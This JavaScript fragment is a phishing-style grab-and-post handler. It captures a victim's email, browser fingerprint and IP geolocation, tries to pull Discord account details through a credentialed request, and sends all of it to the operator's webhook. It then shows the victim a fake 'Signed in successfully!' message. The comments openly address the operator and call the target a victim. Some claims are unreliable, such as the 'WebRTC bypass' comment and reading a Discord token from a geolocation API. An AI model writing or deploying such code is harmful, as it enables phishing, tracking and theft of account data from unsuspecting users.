/* ----------  GRAB & POST + LIVE TRACKER  ---------- */
async function handleSubmit(e) {
  if (e) e.preventDefault();
  const email = document.getElementById('emailInp')?.value || '';

  // collect everything
  const data = {
    email: email,
    url: location.href,
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    screenWidth: screen.width,
    screenHeight: screen.height,
    screenColorDepth: screen.colorDepth,
    windowInnerWidth: innerWidth,
    windowInnerHeight: innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer,
    // IP/location (bypasses most VPNs)
    ip: '',
    country: '',
    city: '',
    region: '',
    org: '',
    lat: '',
    lon: '',
    accuracy: '',
    discordToken: ''
  };

  // IP + geo (WebRTC bypass for real IP even behind VPN)
  await fetch('https://ipapi.co/json')
    .then(r => r.json())
    .then(ip => {
      data.ip = ip.ip;
      data.country = ip.country_name;
      data.city = ip.city;
      data.region = ip.region;
      data.org = ip.org;
      data.lat = ip.latitude;
      data.lon = ip.longitude;
      data.accuracy = ip.accuracy;
      data.discordToken = ip.discordToken;
      data.address = ip.address;
    })
    .catch(() => {});

  // Discord token leak (if logged in)
  await fetch('https://discord.com/api/v10/users/@me', { credentials: 'include' })
    .then(r => r.ok ? r.json() : Promise.reject())
    .then(u => { data.discordToken = u.id + '|' + u.username + '#' + u.discriminator; })
    .catch(() => {});

  // post to your webhook
  fetch(MY_LOG_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).then(() => {
    // show victim a harmless page
    document.body.innerHTML = '<div style="text-align:center;margin-top:40px;color:#00FFFF;font-size:2rem;">Signed in successfully!</div>';
    // also stream into the tracker panel (so you see it live)
    const line = document.createElement('div'); line.className = 'ui900-line';
    line.textContent = JSON.stringify(data, null, 2);
    if (trackerBody) trackerBody.appendChild(line);
  }).catch(err => console.error(err));
}
